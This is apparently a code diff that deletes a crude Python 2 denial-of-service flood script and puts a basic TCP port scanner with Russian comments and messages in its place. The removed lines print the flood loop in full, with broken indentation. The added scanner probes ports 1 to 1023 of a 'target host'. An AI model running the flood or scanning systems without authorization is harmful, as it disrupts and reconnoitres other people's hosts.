@@ -1,41 +1,20 @@
-import time
 import socket
-import os
-import sys
-import string
-def restart_program():
-python = sys.executable
-os.execl(python, python, * sys.argv)
-curdir = os.getcwd()
-print ("DDoS mode loaded")
-host=raw_input( "www.directkvs.com:" )
-port=input( "2970:" )
-message=raw_input( "thanks:" )
-conn=input( "5000:" )
-ip = socket.gethostbyname( host )
-print ("[" + ip + "]")
-print ( "[Ip is locked]" )
-print ( "[Attacking " + host + "]" )
-print ("+----------------------------+")
-def dos():
-#pid = os.fork()
-ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-ddos.connect((host, 80))
-ddos.send( message )
-ddos.sendto( message, (ip, port) )
-ddos.send( message );
-except socket.error, msg:
-print("|[Connection Failed] |")
-print ( "|[DDoS Attack Engaged] |")
-ddos.close()
-for i in range(1, conn):
-dos()
-print ("+----------------------------+")
-print("The connections you requested had finished")
-if __name__ == "__main__":
-answer = raw_input("Do you want to ddos more?")
-if answer.strip() in "y Y yes Yes YES".split():
-restart_program()
+
+def scan_ports(host):
+    open_ports = []
+    for port in range(1, 1024):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, port))
+        if result == 0:
+            open_ports.append(port)
+        sock.close()
+    return open_ports
+
+host = '127.0.0.1'  # замените на IP-адрес целевого хоста
+open_ports = scan_ports(host)
+
+if open_ports:
+    print(f"Открытые порты на {host}: {open_ports}")
 else:
-os.system(curdir+"\Deq\main.py")
+    print(f"На {host} не обнаружено открытых портов.")
